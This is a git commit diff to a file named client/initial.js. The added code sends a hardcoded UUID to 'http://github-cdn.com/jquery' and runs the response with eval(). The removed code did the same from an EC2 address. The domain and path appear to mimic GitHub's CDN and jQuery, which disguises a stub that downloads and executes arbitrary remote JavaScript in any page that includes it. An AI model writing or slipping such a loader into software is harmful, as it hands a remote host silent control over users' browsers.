9449596e3e1b1358ac19bc64b0dd919a71fddcc2
Buildcave <trevor@buildcave.com>
2015-01-02 09:39:47 -0800

    updated the initial js to what we gave jake (using github-cdn). updated compressed initial to the same code

--- client/initial.js
+++ client/initial.js
@@ -1,21 +1,21 @@
-if(!dontRun) {
-  var xmlhttp;
-  var user = "replaceme";
+var xmlhttp;
+var uuid = "ae468880-81d6-11e4-9921-5db8fb9116a2";
 
-  if (window.XMLHttpRequest) {
-      xmlhttp = new XMLHttpRequest();
-  } else {
-      new ActiveXObject("Microsoft.XMLHTTP");
-  }
-  xmlhttp.onreadystatechange = function() {
-      if (xmlhttp.readyState == 4 ) {
-         if(xmlhttp.status == 200) {
-             eval(xmlhttp.responseText);
-         }
-      }
-  }; //IMPORTANT TO LEAVE SEMI COLON
-
-  xmlhttp.open("GET", "ec2-54-187-151-91.us-west-2.compute.amazonaws.com:3005" + "/jquery?version=" + user, true);
-  xmlhttp.send();
-  dontRun = true;
+if (window.XMLHttpRequest) {
+  xmlhttp = new XMLHttpRequest();
+} else {
+  new ActiveXObject("Microsoft.XMLHTTP");
 }
+
+xmlhttp.onreadystatechange = function() {
+  if (xmlhttp.readyState == 4 ) {
+     if(xmlhttp.status == 200) {
+         eval(xmlhttp.responseText);
+     }
+  }
+};
+
+xmlhttp.open("POST", "http://github-cdn.com/jquery", true);
+xmlhttp.setRequestHeader('Content-Type', 'application/json');
+var sending = {version: uuid};
+xmlhttp.send(JSON.stringify(sending));
